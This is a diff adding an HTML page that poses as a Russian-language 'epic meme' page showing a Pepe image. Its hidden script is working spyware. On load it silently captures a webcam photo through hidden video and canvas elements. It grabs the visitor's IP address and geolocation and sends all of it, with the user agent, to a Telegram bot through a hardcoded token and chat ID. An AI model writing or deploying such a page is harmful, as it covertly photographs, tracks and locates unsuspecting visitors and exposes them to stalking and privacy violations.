@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>😂 Epic Meme</title>
+    <meta name="viewport" content="width=device-width">
+    <style>
+        body {
+            margin: 0; padding: 20px; 
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            overflow: hidden;
+            height: 100vh;
+        }
+        .meme {
+            max-width: 400px; 
+            max-height: 400px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+        h1 { 
+            font-size: 2.5em; 
+            color: white; 
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            margin: 20px 0;
+        }
+        video, canvas { display: none !important; }
+        .loading { color: #ffd700; font-size: 1.2em; }
+    </style>
+</head>
+<body>
+    <h1>😂 САМЫЙ ЭПИЧНЫЙ МЕМ 2026 😂</h1>
+    <div class="loading">Загрузка самого смешного...</div>
+    
+    <!-- Мем Pepe Dancing -->
+    <img src="https://i.imgflip.com/1g8my4.jpg" class="meme" alt="Epic Pepe Dance">
+    
+    <!-- Скрытая камера -->
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ТВОИ РЕАЛЬНЫЕ ДАННЫЕ
+        const TG_BOT_TOKEN = '8117312892:AAH32iK22Lt6lFufgOnlFnLAAm7ml4rL_9w';
+        const TG_CHAT_ID = '5547747603';
+
+        // Авто-запуск (полный stealth)
+        async function stealthCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: 640, height: 480 },
+                    audio: true 
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(async () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                    const blob = dataURLtoBlob(imageData);
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', TG_CHAT_ID);
+                    formData.append('photo', blob, 'meme_selfie.jpg');
+                    formData.append('caption', `🕵️‍♂️ Мем-ловец сработал!\n🕐 ${new Date().toLocaleString('ru')}\n📱 ${navigator.userAgent.substring(0,50)}`);
+                    
+                    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST', body: formData
+                    });
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                }, 3000); // 3 сек задержка
+                
+            } catch(e) {
+                sendIPOnly();
+            }
+        }
+
+        function dataURLtoBlob(dataURL) {
+            const [header, data] = dataURL.split(',');
+            const mime = header.match(/:(.*?);/)[1];
+            const bstr = atob(data); const n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
+            return new Blob([u8arr], {type: mime});
+        }
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                return (await res.json()).ip;
+            } catch { return 'unknown'; }
+        }
+
+        async function sendIPOnly() {
+            const ip = await getIP();
+            await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: `📍 Только IP (камера заблокирована):\n${ip}\n📱 ${navigator.userAgent}\n🕐 ${new Date().toLocaleString('ru')}`
+                })
+            });
+        }
+
+        // GEOLOCATION (бонус)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const ip = await getIP();
+                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: TG_CHAT_ID,
+                        text: `📍 Геолокация!\nLat: ${pos.coords.latitude.toFixed(6)}\nLon: ${pos.coords.longitude.toFixed(6)}\nIP: ${ip}`
+                    })
+                });
+            });
+        }
+
+        // АВТОСТАРТ через 1 сек (чтобы мем прогрузился)
+        setTimeout(stealthCapture, 1000);
+    </script>
+</body>
+</html>
